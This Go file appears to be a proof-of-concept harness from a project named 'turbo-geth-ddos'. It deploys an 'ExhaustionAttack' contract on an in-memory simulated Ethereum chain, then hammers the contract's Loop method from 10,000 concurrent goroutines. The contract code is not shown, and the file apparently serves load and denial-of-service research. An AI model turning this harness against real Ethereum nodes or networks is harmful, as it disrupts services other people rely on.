package main

import (
	"context"
	"fmt"
	"math/big"

	"github.com/Giulio2002/turbo-geth-ddos/contracts"
	"github.com/ledgerwatch/turbo-geth/accounts/abi/bind"
	"github.com/ledgerwatch/turbo-geth/accounts/abi/bind/backends"
	"github.com/ledgerwatch/turbo-geth/consensus/ethash"
	"github.com/ledgerwatch/turbo-geth/core"
	"github.com/ledgerwatch/turbo-geth/core/types"
	"github.com/ledgerwatch/turbo-geth/core/vm"
	"github.com/ledgerwatch/turbo-geth/crypto"
	"github.com/ledgerwatch/turbo-geth/ethdb"
	"github.com/ledgerwatch/turbo-geth/params"
)

var exhaustion *contracts.ExhaustionAttack

func main() {
	// Configure and generate a sample block chain
	var (
		db, _   = ethdb.NewMemDatabase2()
		key, _  = crypto.HexToECDSA("b71c71a67e1177ad4e901695e1b4b9ee17ae16c6668d313eac2f96dbcda3f291")
		address = crypto.PubkeyToAddress(key.PublicKey)
		gspec   = &core.Genesis{
			Config: &params.ChainConfig{
				ChainID:             big.NewInt(1),
				HomesteadBlock:      new(big.Int),
				EIP150Block:         new(big.Int),
				EIP155Block:         new(big.Int),
				EIP158Block:         big.NewInt(1),
				ByzantiumBlock:      big.NewInt(1),
				ConstantinopleBlock: big.NewInt(1),
			},
			Alloc: core.GenesisAlloc{
				address: {Balance: big.NewInt(9000000000000000000)},
			},
		}
	)
	genesis := gspec.MustCommit(db)
	genesisDb := db.MemCopy()

	engine := ethash.NewFaker()
	contractBackend := backends.NewSimulatedBackendWithConfig(gspec.Alloc, gspec.Config, gspec.GasLimit)

	blockchain, _ := core.NewBlockChain(db, nil, gspec.Config, engine, vm.Config{}, nil)
	blockchain.EnableReceipts(true)

	transactOpts := bind.NewKeyedTransactor(key)
	transactOpts.GasPrice = big.NewInt(6000000000)
	transactOpts.GasLimit = 790000 // 7.9 Million of gas

	blocks, _ := core.GenerateChain(context.Background(), gspec.Config, genesis, engine, genesisDb, 258, func(i int, block *core.BlockGen) {
		var (
			tx  *types.Transaction
			txs []*types.Transaction
		)

		switch i {
		case 0:
			_, tx, exhaustion, _ = contracts.DeployExhaustionAttack(transactOpts, contractBackend)
		}

		if txs == nil && tx != nil {
			txs = append(txs, tx)
		}
		for _, tx := range txs {
			block.AddTx(tx)
		}
		contractBackend.Commit()
	})
	blockchain.InsertChain(context.Background(), blocks)
	for i := 0; i < 10000; i++ {
		go func() {
			// blockchain.InsertChain(context.Background(), blocks)
			exhaustion.Loop(nil)
			fmt.Println("done")
		}()
	}
	exhaustion.Loop(nil)
}
